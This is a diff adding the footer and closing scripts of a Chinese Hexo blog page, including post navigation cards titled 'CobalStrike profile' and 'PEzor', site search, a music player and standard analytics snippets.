+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/10/28/cobalstrike-profile/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="CobalStrike profile">
+                        
+                        <span class="card-title">CobalStrike profile</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CobalStrike/" class="post-category">
+                                    CobalStrike
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CobalStrike-profile/">
+                        <span class="chip bg-color">CobalStrike profile</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/28/pezor/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="PEzor">
+                        
+                        <span class="card-title">PEzor</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Github%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    Github项目学习
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PEzor/">
+                        <span class="chip bg-color">PEzor</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <a href="/about" target="_blank">每天都要努力哇</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/Redamancy404/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">179.6k</span>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Redamancy404" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+</html>
